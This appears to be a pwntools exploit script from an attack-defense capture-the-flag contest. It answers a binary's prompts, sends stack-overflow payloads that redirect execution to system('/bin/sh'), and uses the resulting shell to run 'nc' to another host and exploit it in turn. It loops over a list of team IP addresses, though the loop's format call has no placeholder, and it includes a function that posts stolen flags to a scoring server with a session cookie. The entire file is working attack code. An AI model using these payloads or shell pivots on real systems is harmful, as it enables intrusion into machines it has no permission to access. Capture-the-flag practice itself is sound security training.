#coding=utf8
import time
from pwn import *
import requests
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
ip = ['192.168.31.58','192.168.31.105','192.168.31.150','192.168.32.54','192.168.32.69','192.168.32.123','192.168.32.135','192.168.33.59','192.168.33.83','192.168.33.99','192.168.33.149','192.168.34.44','192.168.34.93','192.168.34.114','192.168.34.154','192.168.35.51','192.168.35.80','192.168.35.120','192.168.35.140','192.168.36.57','192.168.36.83','192.168.36.117','192.168.36.150','192.168.37.36']
re = requests.session()
cookie = {
	'MacaronSession':'6d748a331f177c19'
}

def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

for ckj in ip:
	cn = remote('192.168.31.82',8000)
#cn = process('./wTEdNnGnqZHQigN8.Pwn02')

	cn.sendline('8584')

	cn.sendline('[1, 1, 3, 5, 11, 21]')

	cn.sendline('mappingstringsforfunandprofit{')

	cn.sendline('0 0 1 0 0 3 1 a')

	sys = 0x080485A0
	#z('set follow-fork-mode parent\nb*0x080487F7\nc')

	buf = 'aaaa' + p32(0x08048CDA)
	cn.sendline(buf)

	buf = 'bbbb' + p32(sys)
	cn.sendline(buf)

	cn.sendline('')
	cn.sendline('')

	buf = 'a' * 0xfc + p32(0x0804B070)
	cn.sendline(buf)

	cn.sendline('/bin/sh\x00')

	cn.recv()


	cn.sendline('nc 192.168.32.123 8000'.format(ckj))


	cn.sendline('8584')

	cn.sendline('[1, 1, 3, 5, 11, 21]')

	cn.sendline('mappingstringsforfunandprofit{')

	cn.sendline('0 0 1 0 0 3 1 a')

	sys = 0x080485A0
	#z('set follow-fork-mode parent\nb*0x080487F7\nc')

	buf = 'aaaa' + p32(0x08048CDA)
	cn.sendline(buf)

	buf = 'bbbb' + p32(sys)
	cn.sendline(buf)

	cn.sendline('')
	cn.sendline('')

	buf = 'a' * 0xfc + p32(0x0804B070)
	cn.sendline(buf)

	cn.sendline('/bin/sh\x00')
	# cn.sendline('getflag')
	# x = cn.readlines()[:-36]
	# print x 
	cn.interactive()

def tijiao(flag):
	flag='flag={}'.format(flag)
	url = 'http://172.16.100.4:4000/sendconflictflag'
	re.post(url= url,cookies = cookie ,data=flag)
